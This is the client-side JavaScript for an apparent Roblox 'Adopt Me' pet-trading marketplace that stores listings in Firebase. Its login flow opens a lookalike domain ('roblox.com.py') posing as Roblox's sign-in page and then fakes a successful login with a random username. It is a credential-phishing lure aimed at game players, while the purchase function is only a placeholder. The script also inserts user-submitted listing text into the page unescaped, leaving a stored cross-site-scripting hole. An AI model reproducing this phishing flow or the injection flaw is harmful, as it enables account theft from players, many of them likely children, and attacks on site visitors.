// =========================================================
// 1. ПОДКЛЮЧЕНИЕ FIREBASE (ОБЛАЧНАЯ БАЗА)
// =========================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// --- ВАШИ НАСТРОЙКИ (Вставь их сюда) ---
const firebaseConfig = {
  apiKey: "AIzaSyBUVG2e9TVe6WlU72Hrjin03QXtkTGiNc0",
  authDomain: "star-marketdb.firebaseapp.com",
  databaseURL: "https://star-marketdb-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "star-marketdb",
  storageBucket: "star-marketdb.firebasestorage.app",
  messagingSenderId: "1040104655803",
  appId: "1:1040104655803:web:45bc355371265d36d8129e"
};

// Инициализация
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const petsRef = ref(db, 'market_lots'); // Ссылка на общую таблицу

// =========================================================
// 2. НАСТРОЙКИ И ПЕРЕМЕННЫЕ
// =========================================================
const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
const NO_IMAGE_URL = "https://cdn-icons-png.flaticon.com/512/1076/1076928.png"; // Заглушка (Лапка)

const ADOPT_ME_DATA = {
    "pets": ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune","Dog","Cat","Otter"]
};

let currentUser = null; 

const petsContainer = document.getElementById('petsContainer');
const loginModal = document.getElementById('loginModal');
const sellModal = document.getElementById('sellModal');

// Заполняем список
const petsList = document.getElementById('petsList');
ADOPT_ME_DATA.pets.sort().forEach(pet => {
    let opt = document.createElement('option');
    opt.value = pet;
    petsList.appendChild(opt);
});

// =========================================================
// 3. ПОЛУЧЕНИЕ ДАННЫХ (ЧТОБЫ ВСЕ ВИДЕЛИ ОДНО И ТО ЖЕ)
// =========================================================
onValue(petsRef, (snapshot) => {
    petsContainer.innerHTML = ""; 
    const data = snapshot.val();

    if (data) {
        // Берем данные из облака
        const lotsArray = Object.values(data).reverse();
        lotsArray.forEach(lot => renderCard(lot));
    } else {
        petsContainer.innerHTML = "<p style='color:#888; width:100%; text-align:center; padding: 20px;'>Лотов пока нет</p>";
    }
});

function renderCard(lot) {
    const card = document.createElement('div');
    card.className = 'item-card';

    let badgesHtml = "";
    if(lot.stickers && lot.stickers.length > 0) {
        badgesHtml = `<div class="badges-row">`;
        lot.stickers.forEach(sticker => {
            badgesHtml += `<div class="mini-sticker ${sticker.class}">${sticker.letter}</div>`;
        });
        badgesHtml += `</div>`;
    }

    // Если картинки нет или она сломана, ставим заглушку
    const imageUrl = lot.image || NO_IMAGE_URL;

    card.innerHTML = `
        <div class="card-img-area">
            ${badgesHtml}
            <img src="${imageUrl}" onerror="this.src='${NO_IMAGE_URL}'">
        </div>
        <div class="card-info">
            <div class="card-name" title="${lot.name}">${lot.name}</div>
            <span class="card-seller">@${lot.contact}</span>
            <div class="price-row">
                <span class="price">${lot.price} ₽</span>
                <button class="btn-buy-card" onclick="alert('Функция покупки в разработке')">
                    <i class="fa-solid fa-cart-shopping"></i>
                </button>
            </div>
        </div>
    `;
    petsContainer.appendChild(card);
}

// =========================================================
// 4. ЛОГИКА АВТОРИЗАЦИИ
// =========================================================
const headerLoginBtn = document.getElementById('headerLoginBtn');
const startAuthBtn = document.getElementById('startAuthBtn');
const confirmAuthBtn = document.getElementById('confirmAuthBtn');
const loginConfirmArea = document.getElementById('loginConfirmArea');

function checkAuth() {
    if (currentUser) return true;
    loginModal.style.display = 'flex';
    startAuthBtn.style.display = 'block';
    loginConfirmArea.style.display = 'none';
    return false;
}

headerLoginBtn.onclick = () => checkAuth();
document.getElementById('inventoryBtn').onclick = (e) => { 
    if(!checkAuth()) e.preventDefault(); 
    else alert("Инвентарь пуст");
};
document.getElementById('balanceBtn').onclick = () => { 
    if(checkAuth()) alert("Пополнение баланса..."); 
};

startAuthBtn.onclick = () => {
    window.open(ROBLOX_AUTH_LINK, '_blank');
    startAuthBtn.style.display = 'none';
    loginConfirmArea.style.display = 'block';
};

confirmAuthBtn.onclick = () => {
    const rnd = Math.floor(Math.random() * 9000) + 1000;
    currentUser = { name: `User_${rnd}` };
    updateHeader();
    loginModal.style.display = 'none';
};

function updateHeader() {
    const area = document.getElementById('userProfileArea');
    area.innerHTML = `
        <div class="user-badge">
            <div class="avatar-circle"></div>
            <span>${currentUser.name}</span>
            <i class="fa-solid fa-right-from-bracket" onclick="location.reload()" style="cursor:pointer; margin-left:5px; color:#666;"></i>
        </div>
    `;
}

// =========================================================
// 5. ПРОДАЖА (ОТПРАВКА В ОБЛАКО)
// =========================================================
const sidebarSellBtn = document.getElementById('sidebarSellBtn');
const sellForm = document.getElementById('sellForm');

sidebarSellBtn.onclick = () => {
    if(checkAuth()) sellModal.style.display = 'flex';
};

const selectedProps = { propFly: false, propRide: false, propNeon: false, propMega: false };

window.toggleProp = function(id) {
    const el = document.getElementById(id);
    if(id === 'propMega' && !selectedProps.propMega) {
        selectedProps.propNeon = false;
        document.getElementById('propNeon').classList.remove('selected');
    }
    if(id === 'propNeon' && !selectedProps.propNeon) {
        selectedProps.propMega = false;
        document.getElementById('propMega').classList.remove('selected');
    }
    selectedProps[id] = !selectedProps[id];
    el.classList.toggle('selected', selectedProps[id]);
};

// Загрузка фото
const fileInput = document.getElementById('petFileInput');
const fileNameLabel = document.getElementById('fileName');
let customImageBase64 = null;

fileInput.onchange = () => {
    const file = fileInput.files[0];
    if (file) {
        if(file.size > 800 * 1024) { // Ограничение ~800КБ
            alert("Фото слишком большое! Выберите файл поменьше.");
            fileInput.value = "";
            return;
        }
        fileNameLabel.innerText = "Выбрано: " + file.name;
        const reader = new FileReader();
        reader.onload = (e) => customImageBase64 = e.target.result;
        reader.readAsDataURL(file);
    }
};

sellForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const petName = document.getElementById('petNameInput').value;
    const price = document.getElementById('petPrice').value;
    const telegram = document.getElementById('telegramUser').value;

    // Если фото нет - ставим NULL (код ниже сам подставит заглушку)
    let finalImage = customImageBase64 ? customImageBase64 : null;

    let activeStickers = [];
    if(selectedProps.propFly) activeStickers.push({class: 'sticker-f', letter: 'F'});
    if(selectedProps.propRide) activeStickers.push({class: 'sticker-r', letter: 'R'});
    if(selectedProps.propNeon) activeStickers.push({class: 'sticker-n', letter: 'N'});
    if(selectedProps.propMega) activeStickers.push({class: 'sticker-m', letter: 'M'});

    const newLot = {
        id: Date.now(),
        name: petName,
        price: price,
        seller: currentUser.name,
        contact: telegram,
        image: finalImage,
        stickers: activeStickers,
        timestamp: Date.now()
    };

    // ОТПРАВЛЯЕМ В FIREBASE
    push(ref(db, 'market_lots'), newLot)
        .then(() => {
            sellModal.style.display = 'none';
            sellForm.reset();
            resetProps();
            fileNameLabel.innerText = "Или останется стоковое";
        })
        .catch((err) => alert("Ошибка: " + err.message));
});

function resetProps() {
    Object.keys(selectedProps).forEach(key => {
        selectedProps[key] = false;
        document.getElementById(key).classList.remove('selected');
    });
    customImageBase64 = null;
}

document.querySelectorAll('.close-modal').forEach(btn => btn.onclick = function() {
    this.closest('.modal-overlay').style.display = 'none';
});
window.onclick = (e) => {
    if(e.target == loginModal || e.target == sellModal) {
        loginModal.style.display = 'none';
        sellModal.style.display = 'none';
    }
}
